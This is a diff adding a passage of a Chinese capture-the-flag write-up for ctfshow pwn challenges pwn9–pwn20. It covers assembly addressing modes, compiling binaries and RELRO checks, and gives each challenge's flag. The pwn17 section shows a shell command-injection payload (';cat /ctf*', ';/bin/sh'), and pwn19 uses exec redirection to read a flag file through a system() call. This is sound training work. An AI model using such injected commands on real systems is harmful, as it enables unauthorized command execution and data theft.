+<td><strong>寄存器相对寻址</strong></td>
+<td><code>mov eax, [ecx+4]</code></td>
+<td><code>eax = *(ecx + 4);</code></td>
+<td>数组/结构体访问</td>
+</tr>
+<tr>
+<td><strong>基址变址寻址</strong></td>
+<td><code>mov eax, [ecx+edx*2]</code></td>
+<td><code>eax = *(ecx + edx*2);</code></td>
+<td>多维数组访问</td>
+</tr>
+<tr>
+<td><strong>相对基址变址寻址</strong></td>
+<td><code>mov eax, [ecx+edx*2-6]</code></td>
+<td><code>eax = *(ecx + edx*2 - 6);</code></td>
+<td>复杂数据结构访问</td>
+</tr>
+</tbody></table>
+<p><strong>为什么需要多种寻址方式？</strong></p>
+<ol>
+<li><strong>灵活性</strong>：适应不同数据结构（如数组、链表、结构体）。</li>
+<li><strong>效率</strong>：基址变址寻址可减少指令数量（如循环遍历数组）。</li>
+<li><strong>可读性</strong>：直接映射高级语言的内存访问模式。</li>
+</ol>
+<p><strong>常见问题</strong></p>
+<p>Q1: 为什么 <code>mov eax, [msg]</code> 和 <code>mov eax, msg</code> 结果不同？</p>
+<ul>
+<li><code>mov eax, msg</code>：将 <code>msg</code> 的地址存入 <code>eax</code>。</li>
+<li><code>mov eax, [msg]</code>：将 <code>msg</code> 地址处的 <strong>值</strong> 存入 <code>eax</code>（解引用）。</li>
+</ul>
+<p>Q2: 如何选择寻址方式？</p>
+<ul>
+<li>访问简单变量 → <strong>直接寻址</strong></li>
+<li>通过指针访问 → <strong>寄存器间接寻址</strong></li>
+<li>数组遍历 → <strong>基址变址寻址</strong></li>
+</ul>
+<p>掌握这些寻址方式是理解汇编和逆向工程的基础！ 🚀</p>
+<hr>
+<h2 id="10-pwn9"><a href="#10-pwn9" class="headerlink" title="10 pwn9"></a>10 pwn9</h2><p>🚩flag：<code>ctfshow{0x636C6557}</code></p>
+<p>💡hint：<code>计组原理</code> <code>汇编基础</code></p>
+<p>题目描述：寄存器间接寻址方式结束后eax寄存器的值为？</p>
+<p>文件片段：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![截屏2025-08-11 15.41.48](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 15.41.48.png)</p>
+<p>![截屏2025-08-11 15.42.43](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 15.42.43.png)</p>
+<p>![image-20250811154831715](/Users/serenius/Library/Application Support/typora-user-images/image-20250811154831715.png)</p>
+<hr>
+<h2 id="11-pwn10"><a href="#11-pwn10" class="headerlink" title="11 pwn10"></a>11 pwn10</h2><p>🚩flag：<code>ctfshow{ome_to_CTFshow_PWN}</code></p>
+<p>💡hint：<code>计组原理</code> <code>汇编基础</code></p>
+<p>题目描述：寄存器相对寻址方式结束后eax寄存器的值为？</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line"></span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line"></span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里将msg的地址（0x80490E8）+ 4 处所执向的地址的值赋给eax</p>
+<p>0x80490E8+4=0x80490EC</p>
+<p>ctfshow{ome_to_CTFshow_PWN}</p>
+<hr>
+<h2 id="12-pwn11"><a href="#12-pwn11" class="headerlink" title="12 pwn11"></a>12 pwn11</h2><p>🚩flag：<code>ctfshow{ome_to_CTFshow_PWN}</code></p>
+<p>💡hint：<code>计组原理</code> <code>汇编基础</code></p>
+<p>基址变址寻址方式结束后的eax寄存器的值为？</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line"></span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line"></span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里将msg的地址（0x80490E8) 复制给ecx</p>
+<p>将2复制给edx，edx=2</p>
+<p>eax=ecx+2*edx</p>
+<p>=0x80490E8+4</p>
+<p>=0x80490EC</p>
+<p>ctfshow{ome_to_CTFshow_PWN}</p>
+<hr>
+<h2 id="13-pwn12"><a href="#13-pwn12" class="headerlink" title="13 pwn12"></a>13 pwn12</h2><p>🚩flag：<code>ctfshow{ome_to_CTFshow_PWN}</code></p>
+<p>💡hint：<code>计组原理</code> <code>汇编基础</code></p>
+<p>相对基址变址寻址方式结束后eax寄存器的值为？</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line"></span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line"></span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br></pre></td></tr></tbody></table></figure>
+
+<p>ecx=0x80490E8</p>
+<p>edx=1</p>
+<p>ecx=ecx+8</p>
+<p>=0x80490E8+8</p>
+<p>=0x80490F0</p>
+<p>eax=ecx+edx*2-6</p>
+<p>=0x80490F0-4</p>
+<p>=0x80490EC</p>
+<p>ctfshow{ome_to_CTFshow_PWN}</p>
+<hr>
+<h2 id="14-pwn13"><a href="#14-pwn13" class="headerlink" title="14 pwn13"></a>14 pwn13</h2><p>🚩flag：<code>ctfshow{hOw_t0_us3_GCC?}</code></p>
+<p>💡hint：<code>二进制文件基础</code></p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gcc -o flag flag.c</span><br><span class="line">./flag</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![截屏2025-08-11 18.19.47](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 18.19.47.png)</p>
+<hr>
+<h2 id="15-pwn14"><a href="#15-pwn14" class="headerlink" title="15 pwn14"></a>15 pwn14</h2><p>🚩flag：<code>ctfshow{01000011_01010100_01000110_01110011_01101000_01101111_01110111_00001010}</code></p>
+<p>💡hint：<code>二进制文件基础</code></p>
+<p>请你阅读以下源码，给定key为”CTFshow”，编译运行即可获得flag</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">    <span class="type">size_t</span> n;</span><br><span class="line">    fp = fopen(<span class="string">"key"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) {</span><br><span class="line">        perror(<span class="string">"Nothing here!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="type">char</span> output[BUFFER_SIZE * <span class="number">9</span> + <span class="number">12</span>]; </span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">"ctfshow{"</span>);</span><br><span class="line">    <span class="keyword">while</span> ((n = fread(buffer, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>), BUFFER_SIZE, fp)) &gt; <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; n; i++) {</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">7</span>; j &gt;= <span class="number">0</span>; j--) {</span><br><span class="line">                offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">"%d"</span>, (buffer[i] &gt;&gt; j) &amp; <span class="number">1</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> (i != n - <span class="number">1</span>) {</span><br><span class="line">                offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">"_"</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (!feof(fp)) {</span><br><span class="line">            offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">" "</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">"}"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, output);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>所以需要先写入key文件，然后编译运行文件。</p>
+<p>![截屏2025-08-11 18.38.07](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 18.38.07.png)</p>
+<hr>
+<h2 id="16-pwn15"><a href="#16-pwn15" class="headerlink" title="16 pwn15"></a>16 pwn15</h2><p>🚩flag：<code>ctfshow{@ss3mb1y_1s_3@sy}</code></p>
+<p>💡hint：<code>二进制文件基础</code></p>
+<p>编译汇编代码到可执行文件，即可拿到flag</p>
+<p>这段代码是一个使用 x86 汇编语言编写的程序，用于在标准输出上打印一串特定格式的字符串。 要将这段代码编译为可执行文件，使用汇编器和链接器进行以下步骤：</p>
+<p>使用以下命令将汇编代码编译为目标文件:</p>
+ <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">nasm -f elf flag.asm -o flag.o</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用以下命令将目标文件链接为可执行文件：</p>
+ <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ld -m elf_i386 -o flag flag.o</span><br></pre></td></tr></tbody></table></figure>
+
+<p>运行此文件：</p>
+ <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">./flag</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 18.44.53.png" alt="截屏2025-08-11 18.44.53" style="zoom:50%;">
+
+
+
+<hr>
+<h2 id="17-pwn16"><a href="#17-pwn16" class="headerlink" title="17 pwn16"></a>17 pwn16</h2><p>🚩flag：<code>ctfshow{daniuniuda}</code></p>
+<p>💡hint：<code>二进制文件基础</code></p>
+<p>使用gcc将其编译为可执行文件</p>
+<p><code>.s</code> 文件是汇编语言源文件的一种常见扩展名。它包含了使用汇编语言编写的程序代码。汇编语言是一种低级编程语言，用于直接操作计算机的指令集架构。 <code> .s</code> 文件通常由汇编器（Assembler）处</p>
+<p>理，将其转换为可执行文件或目标文件。</p>
+<p>可以使用 gcc 命令直接编译汇编语言源文件（<code>.s</code>文件）并将其链接为可执行文件。  gcc 命令具有适用于多种语言的编译器驱动程序功能，它可以根据输入文件的扩展名自动选择适当的编译器和链接器。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gcc -o flag flag.s</span><br><span class="line">./flag</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 18.46.30.png" alt="截屏2025-08-11 18.46.30" style="zoom:50%;">
+
+<hr>
+<h2 id="18-pwn17"><a href="#18-pwn17" class="headerlink" title="18 pwn17"></a>18 pwn17</h2><p>🚩flag：<code>ctfshow{8f284eaf-6fc1-4a4c-92ee-eca8a266d137}</code></p>
+<p>💡hint：<code>二进制文件基础</code> <code>Linux基础命令的拼接</code></p>
+<p>有些命令好像有点不一样？</p>
+<p>不要一直等，可能那样永远也等不到flag</p>
+<img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 18.53.30.png" alt="截屏2025-08-11 18.53.30" style="zoom:50%;">
+
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">;<span class="built_in">cat</span> /ctf*</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>为什么Payload能工作？</strong></p>
+<ol>
+<li><strong>分号 <code>;</code> 的作用</strong>：</li>
+</ol>
+<ul>
+<li>在Linux中，<code>;</code> 用于分隔多个命令，无论前一个命令是否成功。</li>
+<li>例如：<code>command1 ; command2</code> 会依次执行 <code>command1</code> 和 <code>command2</code>。</li>
+</ul>
+<ol start="2">
+<li><strong>通配符 <code>\*</code> 的作用</strong>：</li>
+</ol>
+<ul>
+<li><code>cat /ctf*</code> 会匹配所有以 <code>/ctf</code> 开头的文件（如 <code>/ctfshow_flag</code>）。</li>
+</ul>
+<ol start="3">
+<li><strong>输入长度限制（10字节）</strong>：</li>
+</ol>
+<ul>
+<li><code>;cat /ctf*</code>（9字节）和 <code>;/bin/sh</code>（8字节）均满足长度限制。</li>
+</ul>
+<hr>
+<h2 id="19-pwn18"><a href="#19-pwn18" class="headerlink" title="19 pwn18"></a>19 pwn18</h2><p>🚩flag：<code>ctfshow{02c7e220-25e0-45bf-a1e1-5f58604d9cc9}</code></p>
+<p>💡hint：<code>二进制文件基础</code> <code>Linux基础命令的拼接</code> <code>逆向分析</code></p>
+<p>仔细看看源码，或许有惊喜</p>
+<p>假作真时真亦假，真作假时假亦真</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B10);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B90);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C20);</span><br><span class="line">  <span class="built_in">puts</span>(asc_CB0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D38);</span><br><span class="line">  <span class="built_in">puts</span>(asc_DD0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Type  : Linux_Security_Mechanisms                               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Site  : https://ctf.show/                                       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Hint  : Do you know redirect output ?                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which is the real flag?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">9</span> )</span><br><span class="line">    fake();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    real();</span><br><span class="line">  system(<span class="string">"cat /ctfshow_flag"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>假作真时真亦假，输入9是假，那么就是真flag。</p>
+<img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.01.39.png" alt="截屏2025-08-11 19.01.39" style="zoom:50%;">
+
+<hr>
+<h2 id="20-pwn19"><a href="#20-pwn19" class="headerlink" title="20 pwn19"></a>20 pwn19</h2><p>🚩flag：<code>ctfshow{37005897-483d-4287-aff4-8f5ab17ba35a}</code></p>
+<p>💡hint：<code>二进制文件基础</code>  <code>逆向分析</code></p>
+<p>关闭了输出流，一定是最安全的吗？</p>
+<p>打开环境前先分析反编译源码：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_BF0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C70);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D00);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D90);</span><br><span class="line">  <span class="built_in">puts</span>(asc_E18);</span><br><span class="line">  <span class="built_in">puts</span>(asc_EB0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Type  : Linux_Security_Mechanisms                               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Site  : https://ctf.show/                                       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Hint  : Turn off output, how to get flag? "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fork() )</span><br><span class="line">  {</span><br><span class="line">    wait(<span class="number">0LL</span>);</span><br><span class="line">    sleep(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag is not here!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"give you a shell! now you need to get flag!"</span>);</span><br><span class="line">    fclose(_bss_start);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20u</span>LL);</span><br><span class="line">    system(buf);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们可以使用了 exec 函数来执行 sh命令，并使用 1&gt;&amp;0来进行输出重定向。这个命令将标准输出重定向到标准输入，实际上就是将命令的输出发送到后续命令的输入。</p>
+<p>具体来说， 1&gt;&amp;0 中的 1 表示标准输出， 0 表示标准输入。通过将标准输出重定向到标准输入，可以实现将命令的输出作为后续命令的输入。这样可以在执行 sh命令后，进入一个交互式的Shell环境， 可以在该环境中执行命令并与用户进行交互。</p>
+<p>也可以直接exec cat /ctf* 1&gt;&amp;0 将 cat /ctf*命令的输出发送到标准输入，实际上就是将命令的输 出再次输出到屏幕上。</p>
+<hr>
+<h2 id="21-pwn20"><a href="#21-pwn20" class="headerlink" title="21 pwn20"></a>21 pwn20</h2><p>🚩flag：<code>ctfshow{1_1_0x600f18_0x600f28}</code></p>
+<p>💡hint：<code>Linux安全机制</code></p>
+<p>提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}</p>
+<p>例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</p>
+<p>最终flag为ctfshow{1_1_0x400820_0x8208820}</p>
+<p>若某个表不存在，则无需写其对应地址</p>
+<p>如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}</p>
+<blockquote>
+<p>RELRO（Relocation Read-Only）是一种ELF二进制保护机制，用于防止攻击者篡改动态链接过程中的关键内存区域（如GOT表）。它分为三种模式：</p>
+<ol>
+<li><strong>No RELRO</strong>：GOT/PLT完全可写，极易被攻击；</li>
+<li><strong>Partial RELRO</strong>：GOT部分只读（延迟绑定仍可写），中等防护；</li>
+<li><strong>Full RELRO</strong>：启动时立即解析所有符号并完全锁定GOT为只读，提供最强保护但会略微增加启动时间。<br>使用<code>checksec</code>可查看保护状态，安全场景建议开启Full RELRO（编译选项：<code>-Wl,-z,relro -Wl,-z,now</code>）。</li>
+</ol>
+</blockquote>
+<p>先checksec一下：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![截屏2025-08-11 19.16.53](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.16.53.png)</p>
+<p>没有RELRO保护，故.got和.got.plt都存在。</p>
+<p>查看表的地址：</p>
